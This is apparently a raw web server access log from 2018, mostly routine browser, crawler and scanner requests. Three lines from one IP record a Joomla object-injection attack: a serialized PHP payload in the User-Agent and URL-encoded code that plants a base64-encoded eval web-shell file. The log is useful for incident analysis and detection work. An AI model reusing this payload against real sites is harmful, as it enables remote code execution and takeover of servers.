46.101.80.192 - - [27/Feb/2018:16:49:25 +0000] "GET / HTTP/1.1" 200 1724 "-" "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36"
128.199.94.214 - - [27/Feb/2018:16:57:26 +0000] "HEAD /.git/index HTTP/1.1" 404 0 "-" "Mozilla/5.0 zgrab/0.x"
123.15.50.23 - - [27/Feb/2018:20:30:29 +0000] "GET / HTTP/1.1" 200 9292 "-" "MSDN SurfBear"
113.147.67.193 - - [27/Feb/2018:23:19:46 +0000] "GET / HTTP/1.1" 200 1751 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
113.147.67.193 - - [27/Feb/2018:23:19:54 +0000] "GET / HTTP/1.1" 200 1740 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
113.147.67.193 - - [28/Feb/2018:00:20:59 +0000] "GET / HTTP/1.1" 200 1735 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
113.147.67.193 - - [28/Feb/2018:00:25:41 +0000] "GET / HTTP/1.1" 200 1750 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
54.237.217.239 - - [28/Feb/2018:00:37:15 +0000] "GET / HTTP/1.1" 200 1739 "-" "BUbiNG (+http://law.di.unimi.it/BUbiNG.html)"
113.147.67.193 - - [28/Feb/2018:00:51:57 +0000] "GET / HTTP/1.1" 200 1736 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
113.147.67.193 - - [28/Feb/2018:00:53:14 +0000] "GET / HTTP/1.1" 200 1739 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
113.147.67.193 - - [28/Feb/2018:01:02:45 +0000] "GET / HTTP/1.1" 200 1735 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
113.147.67.193 - - [28/Feb/2018:01:04:02 +0000] "GET / HTTP/1.1" 200 1752 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
113.147.67.193 - - [28/Feb/2018:01:07:04 +0000] "GET / HTTP/1.1" 200 1741 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
113.147.67.193 - - [28/Feb/2018:01:09:27 +0000] "GET / HTTP/1.1" 200 1749 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
113.147.67.193 - - [28/Feb/2018:01:17:25 +0000] "GET / HTTP/1.1" 200 1751 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
113.147.67.193 - - [28/Feb/2018:01:17:40 +0000] "GET / HTTP/1.1" 200 1743 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
113.147.67.193 - - [28/Feb/2018:01:17:46 +0000] "GET / HTTP/1.1" 200 1747 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
113.147.67.193 - - [28/Feb/2018:01:19:42 +0000] "GET / HTTP/1.1" 200 1734 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
113.147.67.193 - - [28/Feb/2018:01:22:06 +0000] "GET / HTTP/1.1" 200 1719 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
13.56.229.65 - - [28/Feb/2018:01:54:48 +0000] "GET / HTTP/1.1" 200 1712 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36"
1.75.213.91 - - [28/Feb/2018:02:04:33 +0000] "GET / HTTP/1.1" 200 1732 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
1.75.213.91 - - [28/Feb/2018:02:13:49 +0000] "GET / HTTP/1.1" 200 1725 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
107.170.213.98 - - [28/Feb/2018:02:30:23 +0000] "GET / HTTP/1.1" 200 9293 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36"
107.170.213.98 - - [28/Feb/2018:02:30:24 +0000] "GET /.well-known/security.txt HTTP/1.1" 404 1722 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36"
118.6.205.26 - - [28/Feb/2018:02:41:37 +0000] "GET / HTTP/1.1" 200 1734 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
118.6.205.26 - - [28/Feb/2018:02:43:46 +0000] "GET / HTTP/1.1" 200 1738 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
118.6.205.26 - - [28/Feb/2018:04:37:30 +0000] "GET / HTTP/1.1" 200 1745 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
118.6.205.26 - - [28/Feb/2018:04:37:38 +0000] "GET / HTTP/1.1" 200 1744 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
118.6.205.26 - - [28/Feb/2018:04:38:14 +0000] "GET / HTTP/1.1" 200 1745 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
118.6.205.26 - - [28/Feb/2018:04:38:56 +0000] "GET / HTTP/1.1" 200 1715 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
118.6.205.26 - - [28/Feb/2018:04:41:32 +0000] "GET / HTTP/1.1" 200 1741 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
118.6.205.26 - - [28/Feb/2018:04:47:38 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
118.6.205.26 - - [28/Feb/2018:04:52:22 +0000] "GET / HTTP/1.1" 200 1731 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
188.68.48.243 - - [28/Feb/2018:05:11:45 +0000] "GET / HTTP/1.1" 200 9292 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
37.140.238.54 - - [28/Feb/2018:06:20:07 +0000] "GET / HTTP/1.1" 200 1748 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.104 Safari/537.36"
37.140.238.54 - - [28/Feb/2018:06:20:11 +0000] "GET / HTTP/1.1" 200 1749 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.104 Safari/537.36"
118.6.205.26 - - [28/Feb/2018:06:56:37 +0000] "GET / HTTP/1.1" 200 1751 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
118.6.205.26 - - [28/Feb/2018:07:49:21 +0000] "GET / HTTP/1.1" 200 1734 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
118.6.205.26 - - [28/Feb/2018:07:57:24 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
66.249.79.120 - - [28/Feb/2018:08:30:49 +0000] "GET / HTTP/1.1" 200 1736 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
118.6.205.26 - - [28/Feb/2018:09:33:20 +0000] "GET / HTTP/1.1" 200 1743 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
118.6.205.26 - - [28/Feb/2018:10:16:05 +0000] "GET / HTTP/1.1" 200 1735 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
118.6.205.26 - - [28/Feb/2018:10:16:52 +0000] "GET / HTTP/1.1" 200 1743 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
118.6.205.26 - - [28/Feb/2018:10:50:04 +0000] "GET / HTTP/1.1" 200 1754 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
171.8.234.164 - - [28/Feb/2018:10:59:44 +0000] "HEAD /gbook/?1_1.html HTTP/1.1" 404 0 "-" "-"
171.8.233.11 - - [28/Feb/2018:10:59:45 +0000] "HEAD /js/close.gif HTTP/1.1" 404 0 "-" "-"
1.75.213.91 - - [28/Feb/2018:11:29:18 +0000] "GET / HTTP/1.1" 499 0 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
1.75.213.91 - - [28/Feb/2018:11:29:23 +0000] "GET / HTTP/1.1" 200 1745 "http://arbcoin.live/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
1.75.213.91 - - [28/Feb/2018:11:29:24 +0000] "GET / HTTP/1.1" 200 1736 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
1.75.213.91 - - [28/Feb/2018:11:29:41 +0000] "GET / HTTP/1.1" 200 1744 "http://arbcoin.live/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
1.75.213.91 - - [28/Feb/2018:11:29:42 +0000] "GET / HTTP/1.1" 200 1735 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
66.249.79.118 - - [28/Feb/2018:11:33:49 +0000] "GET / HTTP/1.1" 200 1715 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
113.147.67.193 - - [28/Feb/2018:11:53:13 +0000] "GET / HTTP/1.1" 200 1739 "http://arbcoin.live/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
113.147.67.193 - - [28/Feb/2018:11:53:14 +0000] "GET / HTTP/1.1" 200 1739 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
111.206.36.11 - - [28/Feb/2018:11:53:43 +0000] "GET / HTTP/1.1" 200 1744 "http://www.baidu.com/s?wd=QRL" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
113.147.67.193 - - [28/Feb/2018:12:24:31 +0000] "GET / HTTP/1.1" 200 1737 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
113.147.67.193 - - [28/Feb/2018:12:32:37 +0000] "GET / HTTP/1.1" 200 1730 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
113.147.67.193 - - [28/Feb/2018:12:32:59 +0000] "GET / HTTP/1.1" 200 1716 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
113.147.67.193 - - [28/Feb/2018:12:52:27 +0000] "GET / HTTP/1.1" 200 1763 "http://arbcoin.live/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
113.147.67.193 - - [28/Feb/2018:12:52:27 +0000] "GET / HTTP/1.1" 200 1750 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
38.99.62.93 - - [28/Feb/2018:13:06:50 +0000] "GET / HTTP/1.1" 200 1746 "-" "Mozilla/5.0 (compatible; evc-batch/2.0)"
113.147.67.193 - - [28/Feb/2018:13:08:51 +0000] "GET / HTTP/1.1" 200 1751 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
113.147.67.193 - - [28/Feb/2018:13:08:51 +0000] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 404 746 "-" "MobileSafari/604.1 CFNetwork/893.14.2 Darwin/17.3.0"
113.147.67.193 - - [28/Feb/2018:13:08:51 +0000] "GET /apple-touch-icon-120x120.png HTTP/1.1" 404 746 "-" "MobileSafari/604.1 CFNetwork/893.14.2 Darwin/17.3.0"
113.147.67.193 - - [28/Feb/2018:13:08:51 +0000] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 404 746 "-" "MobileSafari/604.1 CFNetwork/893.14.2 Darwin/17.3.0"
113.147.67.193 - - [28/Feb/2018:13:08:51 +0000] "GET /apple-touch-icon-120x120.png HTTP/1.1" 404 746 "-" "MobileSafari/604.1 CFNetwork/893.14.2 Darwin/17.3.0"
180.97.35.165 - - [28/Feb/2018:13:09:46 +0000] "GET / HTTP/1.1" 200 1746 "http://www.baidu.com/s?wd=EAB" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"
113.147.67.193 - - [28/Feb/2018:13:29:56 +0000] "GET / HTTP/1.1" 200 1729 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
91.200.12.9 - - [28/Feb/2018:13:46:40 +0000] "GET /?1=%40ini_set%28%22display_errors%22%2C%220%22%29%3B%40set_time_limit%280%29%3B%40set_magic_quotes_runtime%280%29%3Becho%20%27-%3E%7C%27%3Bfile_put_contents%28%24_SERVER%5B%27DOCUMENT_ROOT%27%5D.%27/webconfig.txt.php%27%2Cbase64_decode%28%27PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8%2B%27%29%29%3Becho%20%27%7C%3C-%27%3B HTTP/1.1" 200 9283 "-" "}__test|O:21:\x22JDatabaseDriverMysqli\x22:3:{s:2:\x22fc\x22;O:17:\x22JSimplepieFactory\x22:0:{}s:21:\x22\x5C0\x5C0\x5C0disconnectHandlers\x22;a:1:{i:0;a:2:{i:0;O:9:\x22SimplePie\x22:5:{s:8:\x22sanitize\x22;O:20:\x22JDatabaseDriverMysql\x22:0:{}s:8:\x22feed_url\x22;s:46:\x22eval($_REQUEST[1]);JFactory::getConfig();exit;\x22;s:19:\x22cache_name_function\x22;s:6:\x22assert\x22;s:5:\x22cache\x22;b:1;s:11:\x22cache_class\x22;O:20:\x22JDatabaseDriverMysql\x22:0:{}}i:1;s:4:\x22init\x22;}}s:13:\x22\x5C0\x5C0\x5C0connection\x22;b:1;}\xF0\x9D\x8C\x86"
91.200.12.9 - - [28/Feb/2018:13:47:56 +0000] "GET /?1=%40ini_set%28%22display_errors%22%2C%220%22%29%3B%40set_time_limit%280%29%3B%40set_magic_quotes_runtime%280%29%3Becho%20%27-%3E%7C%27%3Bfile_put_contents%28%24_SERVER%5B%27DOCUMENT_ROOT%27%5D.%27/webconfig.txt.php%27%2Cbase64_decode%28%27PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8%2B%27%29%29%3Becho%20%27%7C%3C-%27%3B HTTP/1.1" 200 9285 "-" "Python-urllib/2.7"
91.200.12.9 - - [28/Feb/2018:13:49:12 +0000] "GET /administrator/?1=%40ini_set%28%22display_errors%22%2C%220%22%29%3B%40set_time_limit%280%29%3B%40set_magic_quotes_runtime%280%29%3Becho%20%27-%3E%7C%27%3Bfile_put_contents%28%24_SERVER%5B%27DOCUMENT_ROOT%27%5D.%27/webconfig.txt.php%27%2Cbase64_decode%28%27PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8%2B%27%29%29%3Becho%20%27%7C%3C-%27%3B HTTP/1.1" 404 1722 "-" "}__test|O:21:\x22JDatabaseDriverMysqli\x22:3:{s:2:\x22fc\x22;O:17:\x22JSimplepieFactory\x22:0:{}s:21:\x22\x5C0\x5C0\x5C0disconnectHandlers\x22;a:1:{i:0;a:2:{i:0;O:9:\x22SimplePie\x22:5:{s:8:\x22sanitize\x22;O:20:\x22JDatabaseDriverMysql\x22:0:{}s:8:\x22feed_url\x22;s:46:\x22eval($_REQUEST[1]);JFactory::getConfig();exit;\x22;s:19:\x22cache_name_function\x22;s:6:\x22assert\x22;s:5:\x22cache\x22;b:1;s:11:\x22cache_class\x22;O:20:\x22JDatabaseDriverMysql\x22:0:{}}i:1;s:4:\x22init\x22;}}s:13:\x22\x5C0\x5C0\x5C0connection\x22;b:1;}\xF0\x9D\x8C\x86"
113.147.67.193 - - [28/Feb/2018:14:06:21 +0000] "GET / HTTP/1.1" 200 1728 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
113.147.67.193 - - [28/Feb/2018:14:07:57 +0000] "GET / HTTP/1.1" 200 1731 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
113.147.67.193 - - [28/Feb/2018:14:11:39 +0000] "GET / HTTP/1.1" 200 1725 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
113.147.67.193 - - [28/Feb/2018:14:44:56 +0000] "GET / HTTP/1.1" 200 1747 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
113.147.67.193 - - [28/Feb/2018:14:53:14 +0000] "GET / HTTP/1.1" 200 1719 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
113.147.67.193 - - [28/Feb/2018:15:24:48 +0000] "GET / HTTP/1.1" 200 1717 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
113.147.67.193 - - [28/Feb/2018:15:32:55 +0000] "GET / HTTP/1.1" 200 1735 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
141.212.122.128 - - [28/Feb/2018:15:55:34 +0000] "GET / HTTP/1.1" 200 1731 "-" "Mozilla/5.0 zgrab/0.x"
113.147.67.193 - - [28/Feb/2018:16:02:10 +0000] "GET / HTTP/1.1" 200 1738 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
113.147.67.193 - - [28/Feb/2018:16:08:41 +0000] "GET / HTTP/1.1" 200 1721 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
66.249.79.118 - - [28/Feb/2018:16:49:00 +0000] "GET / HTTP/1.1" 200 1734 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.122 - - [28/Feb/2018:17:09:10 +0000] "GET / HTTP/1.1" 200 1743 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
208.80.194.31 - - [28/Feb/2018:17:31:09 +0000] "GET / HTTP/1.0" 200 9265 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.23) Gecko/20110920 Firefox/3.6.23"
66.249.79.118 - - [28/Feb/2018:18:00:19 +0000] "GET / HTTP/1.1" 200 1737 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
141.212.122.81 - - [28/Feb/2018:19:00:22 +0000] "GET / HTTP/1.1" 200 1747 "-" "Mozilla/5.0 zgrab/0.x"
66.249.79.90 - - [28/Feb/2018:19:01:19 +0000] "GET / HTTP/1.1" 200 1747 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.86 - - [28/Feb/2018:20:16:34 +0000] "GET / HTTP/1.1" 200 1746 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
162.213.39.19 - - [28/Feb/2018:20:35:08 +0000] "GET / HTTP/1.1" 200 1726 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36"
113.147.67.193 - - [28/Feb/2018:21:33:20 +0000] "GET / HTTP/1.1" 200 1729 "http://arbcoin.live/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
113.147.67.193 - - [28/Feb/2018:21:33:20 +0000] "GET / HTTP/1.1" 200 1729 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
66.249.64.19 - - [28/Feb/2018:22:03:07 +0000] "GET / HTTP/1.1" 200 1738 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
113.147.67.193 - - [28/Feb/2018:23:57:17 +0000] "GET / HTTP/1.1" 200 1735 "http://arbcoin.live/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
113.147.67.193 - - [28/Feb/2018:23:57:17 +0000] "GET / HTTP/1.1" 200 1737 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
113.147.67.193 - - [01/Mar/2018:00:08:03 +0000] "GET / HTTP/1.1" 200 1741 "http://arbcoin.live/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
113.147.67.193 - - [01/Mar/2018:00:08:03 +0000] "GET / HTTP/1.1" 200 1749 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
113.147.67.193 - - [01/Mar/2018:00:08:16 +0000] "GET / HTTP/1.1" 200 1759 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
113.147.67.193 - - [01/Mar/2018:00:08:16 +0000] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 404 746 "-" "MobileSafari/604.1 CFNetwork/893.14.2 Darwin/17.3.0"
113.147.67.193 - - [01/Mar/2018:00:08:16 +0000] "GET /apple-touch-icon-120x120.png HTTP/1.1" 404 746 "-" "MobileSafari/604.1 CFNetwork/893.14.2 Darwin/17.3.0"
113.147.67.193 - - [01/Mar/2018:00:08:17 +0000] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 404 746 "-" "MobileSafari/604.1 CFNetwork/893.14.2 Darwin/17.3.0"
113.147.67.193 - - [01/Mar/2018:00:08:17 +0000] "GET /apple-touch-icon-120x120.png HTTP/1.1" 404 746 "-" "MobileSafari/604.1 CFNetwork/893.14.2 Darwin/17.3.0"
113.147.67.193 - - [01/Mar/2018:00:32:05 +0000] "GET / HTTP/1.1" 200 1747 "http://arbcoin.live/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
113.147.67.193 - - [01/Mar/2018:00:32:05 +0000] "GET / HTTP/1.1" 200 1738 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
208.80.194.31 - - [01/Mar/2018:01:10:32 +0000] "GET / HTTP/1.0" 200 9265 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.53 Safari/533.4"
1.75.213.91 - - [01/Mar/2018:01:11:34 +0000] "GET / HTTP/1.1" 200 1729 "http://arbcoin.live/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
1.75.213.91 - - [01/Mar/2018:01:11:35 +0000] "GET / HTTP/1.1" 499 0 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
1.75.213.91 - - [01/Mar/2018:01:11:45 +0000] "GET / HTTP/1.1" 200 1733 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
